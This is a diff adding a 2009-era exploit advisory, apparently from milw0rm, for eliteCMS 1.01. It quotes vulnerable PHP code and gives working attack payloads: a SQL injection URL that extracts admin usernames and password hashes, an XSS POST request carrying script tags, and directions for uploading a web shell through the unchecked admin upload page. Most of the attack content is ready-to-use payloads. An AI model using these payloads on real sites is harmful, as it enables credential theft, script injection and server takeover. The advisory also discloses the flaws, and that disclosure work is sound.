@@ -1,0 +1,62 @@
+# eliteCMS 1.01 (SQL/XSS) Multiple Remote Vulns
+# by xeno_hive
+# greets to daganarus, dearest of all my friends.
+
+# SQL injection (requires magic_quotes = off)
+
+->/includes/functions.php
+---------------------------------
+89. function get_page_settings() {
+...
+92. $query = "SELECT * FROM pages WHERE id = '{$_GET['page']}'";
+93. $result = mysql_query($query);
+94. confirm_query($result);
+95. $page_settings = mysql_fetch_array($result); 
+96. return $page_settings; }
+...
+294. echo $page_settings['title'];
+---------------------------------
+
+Exploit => index.php?page=-1'+union+select+1,concat(user_name,0x3a,h_password),3,4,5,6,7,8,9,10,11+from+users+limit+0,1/*
+then look at browser's title.
+
+
+# XSS (passive)
+(if contact form is enabled)
+
+->/includes/contact_form.php
+---------------------------------
+36. $mailTo = $settings['site_email'];
+37. $subject = "Feedback email from your eliteCMS website";
+38. $name = $_POST['name'];
+39. $sender_email = $_POST['sender_email'];
+40. $message = $_POST['message'];
+...
+54. $sendmail =  @mail($mailTo, $subject, $body, $headers);
+---------------------------------
+
+So attacker can send mail with http tags.
+---------------------------------
+61. $successMSG = "<span class=\"successMsg\">Thank you dear <span>$name</span> your message has been send
+      successfully.</span>";
+---------------------------------
+
+And he can insert tags into the page.
+
+Exploit => POST-packet
+---------------------------------
+POST /index.php?page=3 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)
+Host: localhost
+
+name=<script>alert("Name")</script>
+&sender_email=someone@evil.com
+&message=<script>alert("Message")</script>
+&email=Send Email
+---------------------------------
+
+# Admin's file upload script without extension checking
+Upload your shell at /admin/manage_uploads.php. Then use it at /uploads/shell.php
+
+# milw0rm.com [2009-06-01]
